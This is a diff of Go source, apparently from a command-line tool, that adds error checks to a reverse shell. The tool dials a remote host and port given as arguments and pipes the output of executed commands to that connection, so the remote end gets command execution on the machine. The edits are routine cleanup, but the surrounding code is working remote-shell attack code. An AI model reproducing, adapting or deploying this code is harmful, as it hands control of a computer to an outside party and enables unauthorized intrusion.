@@ -80,10 +80,10 @@ func initiateShellConnection(args map[string]commando.ArgValue) (net.Conn, error
 	targetAddress := args["rhost"].Value
 	targetPort := args["rport"].Value
 	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", targetAddress, targetPort))
+	check(err)
 	if err == nil {
 		fmt.Printf("Connection established with %s\n", targetAddress)
 	}
-	check(err)
 	return conn, err
 }
 
@@ -112,6 +112,7 @@ func createShell(conn net.Conn) func(string){
 		    }
 		    // Change the directory and return the error.
 		    err := os.Chdir(args[1])
+		    check(err)
 		    if err != nil {
 		    	conn.Write([]byte(err.Error() + "\n"))
 		    }
@@ -134,6 +135,7 @@ func createShell(conn net.Conn) func(string){
 		command.Stderr = conn
 	 	command.Stdout = conn
 	 	err := command.Run()
+	 	check(err)
 	 	if err != nil {
 	  		fmt.Fprintln(conn, err)
 	 	}
@@ -147,6 +149,7 @@ func getShellPrompt() string {
 		prompt := " >"
 
 		currentWorkingDirectory, err := os.Getwd()
+		check(err)
 	    if err != nil {
 	        log.Fatal(err)
 	    }
@@ -156,11 +159,12 @@ func getShellPrompt() string {
 		}
 
 		return prompt
-	}
+}
 
 func shell(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
 	// Initiate Connection
-	conn, _ := initiateShellConnection(args)
+	conn, err := initiateShellConnection(args)
+	check(err)
 	defer conn.Close()
 
 	// Create Shell
